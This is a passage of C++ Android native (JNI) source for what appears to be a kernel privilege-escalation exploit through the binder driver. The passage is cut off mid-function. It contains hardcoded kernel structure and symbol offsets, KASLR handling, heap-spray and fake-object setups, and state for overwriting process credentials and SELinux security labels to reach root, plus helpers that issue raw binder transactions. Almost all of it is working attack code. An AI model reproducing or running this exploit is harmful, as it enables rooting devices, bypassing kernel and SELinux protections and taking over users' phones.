#include <jni.h>

#include <android/binder_ibinder.h>
#include <android/binder_ibinder_jni.h>
#include <android/log.h>

#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <linux/android/binder.h>
#include <linux/capability.h>
#include <linux/futex.h>
#include <linux/fs.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/reboot.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#include <algorithm>
#include <atomic>
#include <cerrno>
#include <cstdarg>
#include <csetjmp>
#include <csignal>
#include <cinttypes>
#include <cstdint>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <sched.h>
#include <set>
#include <string>
#include <thread>
#include <mutex>
#include <chrono>
#include <climits>
#include <map>
#include <vector>
#include <new>

namespace {

constexpr char kOwnerDescriptor[] = "com.vandam.prism.Owner";
constexpr char kOwner2Descriptor[] = "com.vandam.prism.Owner2";
constexpr char kCalibrationDescriptor[] =
        "com.vandam.prism.Calibration";
constexpr char kControlledDescriptor[] =
        "com.vandam.prism.ControlledNode";
constexpr std::uint32_t kInterfaceQuery =
        ('_' << 24U) | ('N' << 16U) | ('T' << 8U) | 'F';
constexpr int kCohortSize = 1152;
constexpr int kSelectedIndex = 0;
constexpr int kPendingTransactions = 129;
constexpr std::uint32_t kNodeHoldCode = 0x4448;
constexpr std::uint32_t kFragmentHoldCode = 0x4265;
constexpr std::uint32_t kControlledHoldCode = 0x4266;
constexpr std::uint32_t kControlledExportCode = 0x4267;
constexpr std::uint32_t kRawCohortSettleCode = 0x42a1;
constexpr std::uint32_t kVictimHoldCode = 0x4262;
constexpr std::uint32_t kBatchEndCode = 0x4264;
constexpr std::uint32_t kNativeBatchCode = 0x426f;
constexpr int kFragmentCount = 2304;
constexpr int kEpitemPreDrainCount = 1536;
constexpr int kEpitemCount = 4096;
constexpr int kRawVictimCount = 19;
constexpr int kRawDecrementCount = 1;
constexpr int kIsolatedRetirementCount = 64;
constexpr int kIsolatedRetirementTimeoutMs = 10000;
constexpr int kIsolatedRetirementPollMs = 20;
constexpr int kCommandWatchdogArmTimeoutSeconds = 120;
constexpr int kRawCohortCount = 96;
constexpr int kRawCohortVictim = 64;
constexpr int kRawCohortAnchorCount = kRawCohortCount - 1;
constexpr int kRawCohortTailCount =
        kRawCohortCount - kRawCohortVictim - 1;
constexpr std::uint64_t kCredSecurityOffset = 120;
constexpr std::uint64_t kKernelLinkBase = UINT64_C(0xffffffc008000000);
constexpr std::uint64_t kFairSchedClassOffset = UINT64_C(0x022e6bc0);
constexpr std::uint64_t kEventfdFopsOffset = UINT64_C(0x02156800);
constexpr std::uint64_t kInitCredOffset = UINT64_C(0x027a0ae0);
constexpr std::uint64_t kInitTaskOffset = UINT64_C(0x0278bec0);
constexpr std::uint64_t kSelinuxBlobSizesOffset = UINT64_C(0x022e81b8);
constexpr std::uint64_t kTaskTasksOffset = UINT64_C(0x4c8);
constexpr std::uint64_t kTaskPidOffset = UINT64_C(0x5c8);
constexpr std::uint64_t kTaskTgidOffset = UINT64_C(0x5cc);
constexpr std::uint64_t kTaskRealCredOffset = UINT64_C(0x778);
constexpr std::uint64_t kTaskCredOffset = UINT64_C(0x780);
constexpr std::uint64_t kTaskCommOffset = UINT64_C(0x790);
constexpr std::uint64_t kTaskFilesOffset = UINT64_C(0x7c0);
constexpr std::uint64_t kFilesFdtOffset = UINT64_C(0x20);
constexpr std::uint64_t kFdtableFdOffset = UINT64_C(0x8);
constexpr std::uint64_t kFileInodeOffset = UINT64_C(0x20);
constexpr std::uint64_t kFileFopsOffset = UINT64_C(0x28);
constexpr std::uint64_t kFileSecurityOffset = UINT64_C(0xd0);
constexpr std::uint64_t kInodeSecurityOffset = UINT64_C(0x38);
constexpr std::uint64_t kFairSchedClassLinkAddress =
        kKernelLinkBase + kFairSchedClassOffset;
constexpr std::uint64_t kKaslrAlignment = UINT64_C(0x200000);

struct RawQueueSlot {
    pthread_t thread {};
    std::atomic<int> state {0};
    int handle = -1;
};

RawQueueSlot g_raw_queue_slots[kRawVictimCount];

bool g_cohort_ready = false;
bool g_cohort_handles_ready = false;
int g_cohort_handles[kCohortSize] {};
int g_calibration_handle = -1;
std::ptrdiff_t g_handle_delta = 0;
std::ptrdiff_t g_top_adjust = 0;
int g_handle_kind = -1;
std::uint64_t g_proxy_native_data = 0;
std::uint64_t g_proxy_words[4] {};
std::size_t g_wrapper_offset = 0;
bool g_cohort_retired = false;
std::atomic<bool> g_epitem_owner_armed {false};
std::atomic<bool> g_raw_target_armed {false};
int g_owner_handle = -1;
std::mutex g_epitem_mutex;
std::vector<int> g_epitem_fds;
std::vector<int> g_file_probe_fds;
std::vector<int> g_file_probe_epoll_fds;
std::atomic<bool> g_terminal_fd_retirement_gate {false};
std::mutex g_terminal_resource_producer_mutex;
std::mutex g_owner_fragment_mutex;
std::vector<binder_uintptr_t> g_owner_fragment_buffers;
int g_controlled_handle = -1;
int g_raw_controlled_handle = -1;
std::uint64_t g_raw_controlled_pointer = 0;
std::uint64_t g_raw_controlled_cookie = 0;
bool g_raw_controlled_promoted = false;
bool g_raw_arbitrary_retained = false;
int g_raw_retained_worker = -1;
bool g_raw_arbitrary_handoff_failed = false;
bool g_raw_victim0_canonical_original = false;
int g_raw_arbitrary_rearm_worker = -1;
std::atomic<std::uint64_t> g_disclosed_node_address {0};
std::atomic<std::uint64_t> g_disclosed_file_address {0};
std::atomic<std::uint64_t> g_disclosed_epitem_address {0};
std::mutex g_file_candidate_mutex;
std::vector<std::uint64_t> g_file_candidates;
std::vector<std::uint64_t> g_epitem_candidates;
std::mutex g_node_candidate_mutex;
std::vector<std::uint64_t> g_node_candidates;
std::mutex g_fake_node_mutex;
std::vector<int> g_fake_node_fds;

constexpr int kFakeControlSprayCount = 1024;
constexpr int kFakeControlStagedCount = 32;
constexpr int kFakeControlReplacementStagedCount = kFakeControlSprayCount - 1;
constexpr std::uint64_t kFakeControlIndexMask = UINT64_C(0x3ff);
constexpr std::size_t kFakeControlSize = 128;
constexpr int kScmPressureTarget = 4096;
constexpr int kScmPressureMinimum = 2000;
constexpr int kScmFileCount = 11;

struct FakeControlSlot {
    int pair[2] {-1, -1};
    int rearm_pair[2] {-1, -1};
    pthread_t thread {};
    pid_t tid = -1;
    bool created = false;
    std::atomic<int> state {0};
    std::atomic<int> activation {0};
    std::atomic<bool> staged {false};
    int staged_generation = 0;
    std::atomic<bool> rearm_requested {false};
    int result = -1;
    int rearm_result = -1;
    int saved_errno = 0;
    int rearm_errno = 0;
    bool poisoned = false;
    int poison_victim = -1;
    std::uint8_t payload[kFakeControlSize] {};
    std::uint8_t rearm_payload[kFakeControlSize] {};
};

FakeControlSlot g_fake_control_slots[kFakeControlSprayCount];
std::mutex g_fake_control_mutex;
std::atomic<int> g_fake_control_gate {0};
std::atomic<int> g_fake_control_staged_gate {0};
bool g_fake_control_active = false;
int g_fake_control_expected = 0;
int g_fake_control_staged_limit = 0;
int g_fake_control_staged_expected = 0;
std::uint64_t g_fake_control_generation = 0;
int g_fake_control_staged_generation = 0;
bool g_terminal_ctlbuf_repair_verified = false;
bool g_terminal_ctlbuf_profile_valid = false;
std::uint64_t g_terminal_helper_task = 0;
std::uint64_t g_terminal_memfd_inode_security_slot = 0;
std::uint64_t g_terminal_memfd_inode_security_original = 0;
std::uint64_t g_terminal_vendor_inode_security = 0;
std::uint64_t g_terminal_vendor_inode_security_word8 = 0;
std::uint32_t g_terminal_vendor_inode_sid = 0;
std::uint64_t g_terminal_ueventd_task = 0;
std::uint64_t g_terminal_ueventd_cred = 0;
std::uint64_t g_terminal_ueventd_security = 0;
std::uint64_t g_terminal_ueventd_security_word8 = 0;
std::uint32_t g_terminal_ueventd_sid = 0;
std::uint64_t g_terminal_owner_task = 0;
int g_terminal_owner_pid = -1;
int g_terminal_watched_fd = -1;
int g_terminal_arbitrary_fd = -1;
int g_terminal_reference_fd = -1;
std::uint64_t g_terminal_watched_file = 0;
std::uint64_t g_terminal_watched_inode = 0;
std::uint64_t g_terminal_watched_fops = 0;
std::uint64_t g_terminal_arbitrary_file = 0;
std::uint64_t g_terminal_arbitrary_inode = 0;
std::uint64_t g_terminal_arbitrary_fops = 0;
std::uint64_t g_terminal_reference_file = 0;
std::uint64_t g_terminal_reference_inode = 0;
std::uint64_t g_terminal_reference_fops = 0;
std::uint64_t g_terminal_selected_epitem = 0;
std::uint64_t g_terminal_expected_fops = 0;
std::uint32_t g_terminal_expected_ep_links = 0;
std::uint64_t g_terminal_donor_task = 0;
int g_terminal_donor_pid = -1;
std::uint64_t g_terminal_donor_real_cred_slot = 0;
std::uint64_t g_terminal_donor_cred_slot = 0;
std::uint32_t g_terminal_donor_usage = 0;
std::uint32_t g_terminal_donor_ids[8] {};
std::uint64_t g_terminal_donor_caps = 0;
std::uint32_t g_terminal_donor_sid = 0;
std::uint64_t g_terminal_donor_security = 0;
int g_terminal_module_memfd = -1;
int g_terminal_vendor_fd = -1;
int g_terminal_ueventd_pid = -1;
std::mutex g_ctlbuf_rescue_plan_mutex;
std::string g_ctlbuf_rescue_plan;
std::string g_ctlbuf_rescue_parameters;
int g_ctlbuf_rescue_module_fd = -1;
std::atomic<int> g_ctlbuf_rescue_plan_ready {0};
bool g_ctlbuf_rescue_module_loaded = false;
bool g_ctlbuf_rescue_module_unloaded = false;
int g_ctlbuf_rescue_tids[7] {};
std::uint64_t g_ctlbuf_rescue_nodes[7] {};
int g_selected_epoll_fd = -1;
int g_selected_epoll_watched_fd = -1;
int g_arb_file_fd = -1;
int g_raw_reply_signal_fd = -1;
std::mutex g_raw_reply_signal_mutex;
int g_raw_target_handle = -1;
int g_raw_target_pid = -1;
std::uint64_t g_raw_target_proc = 0;
std::uint64_t g_arb_cred_address = 0;
bool g_arb_read_ready = false;
int g_credential_target_handle = -1;
int g_credential_target_pid = -1;
std::uint32_t g_credential_target_uid = 0;
std::uint32_t g_credential_target_gid = 0;
bool g_credential_target_external = false;
std::mutex g_credential_target_death_mutex;
bool g_credential_target_death_recorded = false;
std::string g_credential_target_death_proof;
int g_security_target_handle = -1;
int g_security_target_pid = -1;
std::uint64_t g_security_target_proc = 0;
std::uint64_t g_cached_current_binder_proc = 0;
std::uint32_t g_fake_security_sid = 0;
std::uint64_t g_security_target_blob = 0;
std::uint64_t g_credential_target_task = 0;
std::uint64_t g_credential_target_security = 0;
std::uint64_t g_security_target_task = 0;
std::uint64_t g_security_target_cred = 0;
std::uint64_t g_security_target_real_cred_slot = 0;
std::uint64_t g_security_target_cred_slot = 0;
std::uint64_t g_security_target_cred_header = 0;
std::uint32_t g_security_target_baseline_usage = 0;
bool g_terminal_donor_preexit_refs_valid = false;
std::uint32_t g_terminal_donor_preexit_usage = 0;
std::uint32_t g_last_write_expected_usage = 0;
std::uint32_t g_last_write_observed_usage = 0;
std::uint64_t g_security_target_cred_ids[4] {};
std::uint64_t g_security_target_cred_caps = 0;
std::uint64_t g_security_target_cred_repair = UINT64_MAX;
bool g_security_target_cred_snapshot = false;
std::uint64_t find_target_binder_proc(std::uint64_t proc, int handle);
std::uint64_t find_security_target_binder_proc();
bool security_target_proc_is_live(std::uint64_t proc);
bool g_security_target_slots_valid = false;
bool g_direct_init_target = false;
bool g_direct_security_repair = false;
bool g_direct_cred_quarantine = false;
bool g_direct_terminal_cleanup = false;
int g_direct_write_step = 0;
int g_internal_write_misses = 0;
int g_write_victims_used = 0;
int g_write_successes = 0;
bool g_null_write_armed = false;
int g_null_write_armed_victim = -1;
std::uint64_t g_direct_init_real_cred_slot = 0;
std::uint64_t g_direct_init_cred_slot = 0;
std::uint64_t g_direct_cred_value = 0;
std::uint64_t g_direct_quarantine_value = 0;
constexpr int kCredentialSnapshotWords = 19;
std::uint64_t g_private_cred = 0;
std::uint64_t g_private_cred_snapshot[kCredentialSnapshotWords] {};
std::uint32_t g_private_cred_sid = 0;
std::uint64_t g_final_shell_cred = 0;
bool g_final_shell_cred_valid = false;
std::atomic<int> g_helper_normalise_gate {0};
int g_helper_normalise_uid_result = -1;
int g_helper_normalise_gid_result = -1;
int g_helper_waiting_fd = -1;
enum CommandRootWatchdogPhase {
    kCommandWatchdogIdle = 0,
    kCommandWatchdogPrepared = 1,
    kCommandWatchdogWaitingForArm = 2,
    kCommandWatchdogCreating = 3,
    kCommandWatchdogReady = 4,
    kCommandWatchdogNormalising = 5,
    kCommandWatchdogNormalised = 6,
    kCommandWatchdogFailed = -1,
};

struct CommandRootIdentity {
    pid_t pid = -1;
    pid_t tid = -1;
    uid_t uid[3] {static_cast<uid_t>(-1), static_cast<uid_t>(-1),
                  static_cast<uid_t>(-1)};
    gid_t gid[3] {static_cast<gid_t>(-1), static_cast<gid_t>(-1),
                  static_cast<gid_t>(-1)};
    uid_t fsuid = static_cast<uid_t>(-1);
    gid_t fsgid = static_cast<gid_t>(-1);
    std::uint64_t effective_caps = 0;
};

std::atomic<int> g_command_watchdog_phase {kCommandWatchdogIdle};
std::atomic<int> g_command_watchdog_arm {0};
std::atomic<int> g_command_watchdog_ready {0};
std::atomic<int> g_command_watchdog_normalise {0};
std::atomic<int> g_command_watchdog_exit {0};
std::atomic<int> g_command_watchdog_tid {-1};
std::atomic<int> g_resukisu_action {0};
std::atomic<int> g_resukisu_exit {-1};
std::atomic<int> g_resukisu_errno {0};
std::atomic<int> g_resukisu_manager_uid {-1};
std::atomic<std::uint64_t> g_resukisu_kernel_base {0};
int g_resukisu_fd = -1;
int g_resukisu_module_fd = -1;
using ReSukiProbeFunction = std::uint32_t (*)();
using ReSukiRelocateProbeFunction = int (*)(std::uint64_t);
using ReSukiStageFunction = int (*)(int, std::uint64_t);
using ReSukiLoadFunction = int (*)(
        std::uint32_t, int, int, std::uint64_t);
ReSukiProbeFunction g_resukisu_probe = nullptr;
ReSukiRelocateProbeFunction g_resukisu_relocate_probe = nullptr;
ReSukiStageFunction g_resukisu_stage = nullptr;
ReSukiLoadFunction g_resukisu_load = nullptr;
void* g_resukisu_library = nullptr;
std::atomic<int> g_ctlbuf_donor_freeze_request {0};
std::atomic<int> g_ctlbuf_donor_pid {-1};
std::atomic<int> g_ctlbuf_donor_signal_state {0};
std::atomic<int> g_ctlbuf_donor_frozen_confirmation {0};
std::atomic<int> g_ctlbuf_donor_leader_stage {0};
std::atomic<int> g_ctlbuf_donor_signal_pid {-1};
std::atomic<int> g_ctlbuf_donor_kill_rc {-1};
std::atomic<int> g_ctlbuf_donor_kill_errno {0};
std::atomic<int> g_ctlbuf_donor_frozen {0};
std::atomic<int> g_ctlbuf_donor_resumed {0};
std::atomic<int> g_ctlbuf_rescue_stage {0};
std::atomic<int> g_ctlbuf_rescue_result {0};
std::atomic<int> g_ctlbuf_rescue_errno {0};
std::atomic<int> g_ctlbuf_rescue_detail {0};
std::mutex g_ctlbuf_finalise_mutex;
std::string g_ctlbuf_finalise_proof;
bool g_ctlbuf_finalise_verified = false;
int g_ctlbuf_finalise_status_code = 0;
bool g_terminal_host_normalisation_gate = false;
struct CtlbufFinalisePlan {
    bool valid = false;
    int helper_tid = -1;
    std::uint64_t helper_task = 0;
    std::uint64_t donor_cred = 0;
    std::uint64_t private_cred = 0;
    std::uint64_t owner_task = 0;
    int owner_pid = -1;
    int watched_fd = -1;
    int arbitrary_fd = -1;
    int reference_fd = -1;
    std::uint64_t watched_file = 0;
    std::uint64_t watched_inode = 0;
    std::uint64_t watched_fops = 0;
    std::uint64_t arbitrary_file = 0;
    std::uint64_t arbitrary_inode = 0;
    std::uint64_t arbitrary_fops = 0;
    std::uint64_t reference_file = 0;
    std::uint64_t reference_inode = 0;
    std::uint64_t reference_fops = 0;
    std::uint64_t selected_epitem = 0;
    std::uint64_t expected_fops = 0;
    std::uint32_t expected_count = 0;
    std::uint64_t donor_task = 0;
    int donor_pid = -1;
    std::uint64_t donor_real_cred_slot = 0;
    std::uint64_t donor_cred_slot = 0;
    std::uint32_t donor_usage = 0;
    std::uint32_t donor_ids[8] {};
    std::uint64_t donor_caps = 0;
    std::uint32_t donor_sid = 0;
    std::uint64_t donor_security = 0;
    std::uint64_t donor_security_original = 0;
    std::uint64_t borrowed_task_security_word8 = 0;
    std::uint64_t inode_security_original = 0;
    std::uint64_t borrowed_inode_security_word8 = 0;
};
CtlbufFinalisePlan g_ctlbuf_finalise_plan;
struct CtlbufDonorResumeProof {
    bool valid = false;
    std::uint64_t cookie_hi = 0;
    std::uint64_t cookie_lo = 0;
    std::uint64_t helper_task = 0;
    std::uint64_t donor_task = 0;
    int donor_pid = -1;
    int donor_tgid = -1;
    int signal_result = -1;
    int signal_errno = -1;
    std::uint64_t before_state = 0;
    std::uint64_t before_exit_state = 0;
    std::uint64_t after_state = 0;
    std::uint64_t after_exit_state = 0;
    std::uint32_t before_threads = 0;
    std::uint32_t before_stopped = 0;
    std::uint32_t after_threads = 0;
    std::uint32_t after_stopped = 0;
    std::uint32_t stable_samples = 0;
    std::uint64_t task_security = 0;
    std::uint64_t task_security_word8 = 0;
    std::uint64_t inode_security = 0;
    std::uint64_t inode_security_word8 = 0;
};
CtlbufDonorResumeProof g_ctlbuf_donor_resume_proof;
constexpr std::uint64_t kCtlbufResumeMagic = UINT64_C(0x4c5033524553554d);
constexpr std::uint32_t kCtlbufResumeVersion = 1;
constexpr std::uint64_t kCtlbufResumeCommitXor =
        UINT64_C(0xa5d91f7462c83be0);
struct CtlbufDonorResumeRecord {
    std::uint64_t magic;
    std::uint64_t cookie_hi;
    std::uint64_t cookie_lo;
    std::uint64_t helper_task;
    std::uint64_t donor_task;
    std::uint64_t pre_state;
    std::uint64_t pre_exit_state;
    std::uint64_t post_state;
    std::uint64_t post_exit_state;
    std::uint64_t task_security;
    std::uint64_t task_security_word8;
    std::uint64_t inode_security;
    std::uint64_t inode_security_word8;
    std::uint32_t version;
    std::uint32_t size;
    std::int32_t helper_pid;
    std::int32_t donor_pid;
    std::int32_t donor_tgid;
    std::int32_t signal;
    std::int32_t signal_rc;
    std::int32_t signal_errno;
    std::uint32_t pre_thread_count;
    std::uint32_t pre_stopped_count;
    std::uint32_t post_thread_count;
    std::uint32_t post_stopped_count;
    std::uint32_t stable_samples;
    std::uint32_t labels_restored;
    std::uint32_t resumed;
    std::uint32_t proof;
    std::uint64_t commit;
};
static_assert(sizeof(CtlbufDonorResumeRecord) == 176);
static_assert(offsetof(CtlbufDonorResumeRecord, commit) == 168);
alignas(4096) CtlbufDonorResumeRecord g_ctlbuf_donor_resume_record {};
std::uint64_t g_ctlbuf_resume_cookie_hi = 0;
std::uint64_t g_ctlbuf_resume_cookie_lo = 0;
char g_command_watchdog_nonce[33] {};
int g_command_watchdog_output_fd = -1;
pthread_t g_command_watchdog_thread {};
bool g_command_watchdog_thread_created = false;
CommandRootIdentity g_command_watchdog_leader_identity {};
CommandRootIdentity g_command_watchdog_identity {};
std::uint64_t g_profile_cred_slot = 0;
std::uint64_t g_profile_init_cred = 0;
std::uint64_t g_profile_kernel_slide = 0;
std::uint64_t g_last_binder_probe_file = 0;
std::uint64_t g_last_binder_probe_fops = 0;
std::uint64_t g_last_binder_probe_base = 0;
std::uint64_t g_last_binder_probe_init_cred = 0;
std::uint64_t g_last_binder_probe_init_header = 0;
std::uint64_t g_last_binder_probe_init_ids[4] {};
std::uint64_t g_last_binder_probe_init_caps = 0;
std::uint64_t g_last_binder_probe_init_security = 0;
std::uint32_t g_last_binder_probe_init_sid = 0;
std::uint64_t g_last_main_binder_proc = 0;
std::uint64_t g_last_binder_probe_anchor_proc = 0;
std::uint64_t g_last_target_binder_proc = 0;
int g_last_binder_probe_nodes = 0;
int g_last_binder_probe_marker_offset = -1;
int g_last_binder_probe_stage = 0;
int g_last_binder_probe_errno = 0;
int g_last_binder_ref_nodes = 0;
int g_last_target_node_nodes = 0;
int g_last_target_pid = -1;
int g_last_binder_proc_nodes = 0;
std::uint64_t g_last_target_nodes[8] {};
std::uint64_t g_last_target_pointers[8] {};
std::uint64_t g_last_target_cookies[8] {};
std::uint64_t g_raw_victim_pointers[kRawVictimCount] {};
std::uint64_t g_raw_victim_cookies[kRawVictimCount] {};
std::uint64_t g_raw_victim_nodes[kRawVictimCount] {};
std::uint64_t g_raw_export_binder_tokens[kRawVictimCount] {};
std::uint64_t g_raw_export_cookie_tokens[kRawVictimCount] {};
std::uint64_t g_raw_cohort_binder_tokens[kRawCohortCount] {};
std::uint64_t g_raw_cohort_cookie_tokens[kRawCohortCount] {};
bool g_raw_victims_configured = false;
std::mutex g_raw_isolated_mutex;
enum class IsolatedRetirementState {
    kIdle,
    kCollecting,
    kRecorded,
    kRetiring,
    kProved,
    kFailed,
    kConsumed,
};

std::uint64_t g_raw_isolated_generation = 0;
IsolatedRetirementState g_raw_isolated_state =
        IsolatedRetirementState::kIdle;
std::vector<int> g_raw_isolated_pids;
int g_raw_isolated_historical_total = 0;
int g_raw_isolated_historical_retired = 0;
bool g_raw_isolated_retirement_proved = false;
int g_raw_controlled_free_pending_victim = -1;
std::set<int> g_raw_controlled_unlinks;
std::string g_terminal_cleanup_result;

struct TerminalDonorRetirementProof {
    std::uint64_t sequence = 0;
    bool valid = false;
    bool consumed = false;
    bool helper_retired = false;
    bool helper_unlinked = false;
    bool credential_target_death = false;
    int helper_unlink_samples = 0;
    std::uint64_t helper_proc = 0;
    bool donor_live_before = false;
    int donor_live_before_stage = 0;
    int donor_live_a_stage = 0;
    int donor_live_b_stage = 0;
    bool donor_slots = false;
    std::uint64_t donor_proc = 0;
    std::uint64_t donor_task = 0;
    std::uint64_t donor_cred = 0;
    std::uint64_t donor_blob = 0;
    std::uint32_t donor_sid = 0;
    std::uint64_t donor_caps = 0;
    std::uint64_t donor_real_cred_slot = 0;
    std::uint64_t donor_cred_slot = 0;
    std::uint64_t donor_real_cred = 0;
    std::uint64_t donor_cred_value = 0;
    bool donor_baseline = false;
    std::uint32_t baseline_usage = 0;
    std::uint32_t observed_usage = UINT32_MAX;
    bool donor_live_pre_snapshot_2 = false;
    int donor_live_pre_snapshot_2_stage = 0;
    int donor_snapshot_stage = 0;
    std::uint64_t donor_repair = UINT64_MAX;
    int complete_samples = 0;
    bool preexit_refs_valid = false;
    std::uint32_t preexit_usage = 0;
    bool donor_refs_retired = false;
};

std::mutex g_terminal_donor_proof_mutex;
std::uint64_t g_terminal_sequence = 0;
TerminalDonorRetirementProof g_terminal_donor_proof;

struct IsolatedRetirementSnapshot {
    int total = 0;
    int retired = 0;
    int controlled_unlinks = 0;
    bool proved = false;
    std::set<int> controlled_unlink_victims;
};

IsolatedRetirementSnapshot consume_isolated_retirement_proof() {
    std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
    IsolatedRetirementSnapshot snapshot;
    if (g_raw_isolated_state == IsolatedRetirementState::kProved &&
        g_raw_isolated_pids.size() == kIsolatedRetirementCount &&
        g_raw_isolated_historical_total == kIsolatedRetirementCount &&
        g_raw_isolated_historical_retired == kIsolatedRetirementCount &&
        g_raw_isolated_retirement_proved) {
        snapshot.total = g_raw_isolated_historical_total;
        snapshot.retired = g_raw_isolated_historical_retired;
        snapshot.controlled_unlinks =
                static_cast<int>(g_raw_controlled_unlinks.size());
        snapshot.controlled_unlink_victims = g_raw_controlled_unlinks;
        snapshot.proved = true;

        g_raw_isolated_state = IsolatedRetirementState::kConsumed;
        g_raw_isolated_pids.clear();
        g_raw_isolated_historical_total = 0;
        g_raw_isolated_historical_retired = 0;
        g_raw_isolated_retirement_proved = false;
        g_raw_controlled_free_pending_victim = -1;
        g_raw_controlled_unlinks.clear();
    }
    return snapshot;
}

constexpr std::uint64_t kFakePtrMarker = UINT64_C(0x5334f00d00000058);
constexpr std::uint64_t kFakeCookieMarker = UINT64_C(0x4334f00d00000060);
constexpr std::uint64_t kIndexedPtrBase = UINT64_C(0x5334f00d10000000);
constexpr std::uint64_t kIndexedCookieBase = UINT64_C(0x4334f00d10000000);

struct BatchToken {
    std::uint64_t ptr;
    std::uint64_t cookie;

    bool operator<(const BatchToken& other) const {
        return ptr < other.ptr ||
                (ptr == other.ptr && cookie < other.cookie);
    }

    bool operator==(const BatchToken& other) const {
        return ptr == other.ptr && cookie == other.cookie;
    }
};

constexpr int kPteCandidates = 32;
constexpr int kPteMappingsPerCandidate = 512;
constexpr int kPteEntries = 512;
constexpr std::size_t kPageSize = 4096;
constexpr std::size_t kPteSpan = kPageSize * kPteEntries;
constexpr std::size_t kPteWindowSize = kPteSpan * kPteEntries;

struct PteProbe {
    void* address;
    int candidate_offset;
};

int g_pte_backing = -1;
std::vector<void*> g_pte_windows;
std::vector<PteProbe> g_pte_probes;
thread_local sigjmp_buf* g_fault_jump = nullptr;

void write_command(void* output, std::uint32_t command, const void* data,
                   std::size_t data_size) {
    std::memcpy(output, &command, sizeof(command));
    if (data != nullptr && data_size != 0) {
        std::memcpy(static_cast<std::uint8_t*>(output) + sizeof(command),
                    data, data_size);
    }
}

int write_binder_commands(int fd, const void* data, std::size_t size) {
    const auto* bytes = static_cast<const std::uint8_t*>(data);
    std::size_t consumed = 0;
    for (int attempt = 0; attempt < 256 && consumed < size; ++attempt) {
        binder_write_read request {};
        request.write_size = size - consumed;
        request.write_buffer = reinterpret_cast<binder_uintptr_t>(
                bytes + consumed);
        errno = 0;
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            if (errno == EINTR) {
                continue;
            }
            return -1;
        }
        if (request.write_consumed == 0 ||
            request.write_consumed > size - consumed) {
            errno = EIO;
            return -1;
        }
        consumed += static_cast<std::size_t>(request.write_consumed);
    }
    return consumed == size ? 0 : -1;
}

int duplicate_binder_fd() {
    struct stat binder_stat {};
    if (stat("/dev/binder", &binder_stat) != 0) {
        return -1;
    }
    DIR* directory = opendir("/proc/self/fd");
    if (directory == nullptr) {
        return -1;
    }
    int result = -1;
    while (dirent* entry = readdir(directory)) {
        char* end = nullptr;
        long candidate = strtol(entry->d_name, &end, 10);
        if (end == entry->d_name || *end != '\0' || candidate < 0) {
            continue;
        }
        struct stat candidate_stat {};
        if (fstat(static_cast<int>(candidate), &candidate_stat) != 0 ||
            !S_ISCHR(candidate_stat.st_mode) ||
            candidate_stat.st_rdev != binder_stat.st_rdev) {
            continue;
        }
        result = fcntl(static_cast<int>(candidate), F_DUPFD_CLOEXEC, 0);
        if (result >= 0) {
            break;
        }
    }
    closedir(directory);
    return result;
}

bool pin_current_thread_to_cpu(int cpu, int* saved_errno = nullptr,
                               int* observed_cpu = nullptr) {
    if (saved_errno != nullptr) {
        *saved_errno = 0;
    }
    if (observed_cpu != nullptr) {
        *observed_cpu = sched_getcpu();
    }
    if (cpu < 0 || cpu >= CPU_SETSIZE) {
        if (saved_errno != nullptr) {
            *saved_errno = EINVAL;
        }
        return false;
    }
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    for (int attempt = 0; attempt < 8; ++attempt) {
        errno = 0;
        if (sched_setaffinity(0, sizeof(set), &set) == 0) {
            for (int confirmation = 0; confirmation < 200; ++confirmation) {
                int current = sched_getcpu();
                if (observed_cpu != nullptr) {
                    *observed_cpu = current;
                }
                if (current == cpu) {
                    return true;
                }
                sched_yield();
                usleep(50);
            }
        } else if (saved_errno != nullptr) {
            *saved_errno = errno;
        }
        usleep(200);
    }
    return false;
}

void* raw_queue_worker(void* argument) {
    auto* slot = static_cast<RawQueueSlot*>(argument);
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    int result = sched_setaffinity(0, sizeof(set), &set);
    int fd = result == 0 ? duplicate_binder_fd() : -1;
    binder_transaction_data transaction {};
    transaction.target.handle = static_cast<std::uint32_t>(slot->handle);
    transaction.code = kControlledHoldCode;
    std::uint8_t command[
            sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(command, BC_TRANSACTION, &transaction,
                  sizeof(transaction));
    result = fd >= 0 ? write_binder_commands(
            fd, command, sizeof(command)) : -1;
    int saved_errno = result == 0 ? 0 : errno;
    if (fd >= 0) {
        close(fd);
    }
    int state = result == 0 ? 1 : -(saved_errno != 0 ? saved_errno : EIO);
    slot->state.store(state, std::memory_order_release);
    for (;;) {
        syscall(SYS_futex, &slot->state, FUTEX_WAIT_PRIVATE, state,
                nullptr, nullptr, 0);
    }
}

bool free_buffer(int fd, binder_uintptr_t buffer) {
    if (buffer == 0) {
        return false;
    }
    std::uint8_t command[sizeof(std::uint32_t) + sizeof(buffer)] {};
    write_command(command, BC_FREE_BUFFER, &buffer, sizeof(buffer));
    binder_write_read request {};
    request.write_size = sizeof(command);
    request.write_buffer = reinterpret_cast<binder_uintptr_t>(command);
    return ioctl(fd, BINDER_WRITE_READ, &request) == 0 &&
            request.write_consumed == sizeof(command);
}

[[noreturn]] void park_current_thread() {
    for (;;) {
        pause();
    }
}

std::string query_descriptor(int fd, int handle) {
    binder_transaction_data transaction {};
    transaction.target.handle = static_cast<std::uint32_t>(handle);
    transaction.code = kInterfaceQuery;
    std::uint8_t write_buffer[sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(write_buffer, BC_TRANSACTION, &transaction,
                  sizeof(transaction));

    bool written = false;
    for (int attempt = 0; attempt < 16; ++attempt) {
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.write_size = written ? 0 : sizeof(write_buffer);
        request.write_buffer = reinterpret_cast<binder_uintptr_t>(
                written ? nullptr : write_buffer);
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            return {};
        }
        written = true;
        for (std::size_t offset = 0;
